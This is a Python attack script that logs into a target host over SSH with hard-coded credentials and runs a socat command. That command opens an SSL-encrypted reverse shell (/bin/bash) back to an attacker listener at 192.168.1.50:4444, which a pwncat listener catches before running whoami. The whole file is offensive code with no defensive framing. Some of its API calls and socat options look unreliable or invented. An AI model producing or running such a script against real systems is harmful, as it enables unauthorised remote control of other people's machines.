import paramiko
import pwncat
import time

# Target SSH credentials
target_host = "192.168.1.100"
target_port = 22
username = "targetuser"
password = "targetpassword"

# Attacker listener details
attacker_host = "192.168.1.50"
attacker_port = 4444

# Paths to SSL certificate and key (must exist on attacker's machine)
cert_path = "/path/to/cert.pem"
key_path = "/path/to/key.pem"

# Start pwncat listener with SSL
listener = pwncat.listen(
    f"ssl://{attacker_host}:{attacker_port}",
    ssl_cert=cert_path,
    ssl_key=key_path
)

# Define callback for new session
def on_session_established(session):
    print(f"[+] SSL reverse shell connected from {session.client}")
    print("Running whoami...")
    print(session.run("whoami"))
    session.close()

listener.established = on_session_established

# Connect to target via SSH using Paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target_host, port=target_port, username=username, password=password)

# Deploy socat reverse shell with SSL
reverse_shell_cmd = (
    f"socat - OPENSSL:{attacker_host}:{attacker_port},verify=0,cert=/tmp/fake.pem,openssl-version=TLS1.2,forever "
    f"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &"
)

# Note: /tmp/fake.pem is a dummy cert path to satisfy socat's syntax; verify=0 disables validation

stdin, stdout, stderr = ssh.exec_command(reverse_shell_cmd)
print("[*] SSL reverse shell command sent via SSH")

# Close SSH connection
ssh.close()

# Wait for the reverse shell to connect
print("[*] Waiting for SSL reverse shell...")
listener.run()
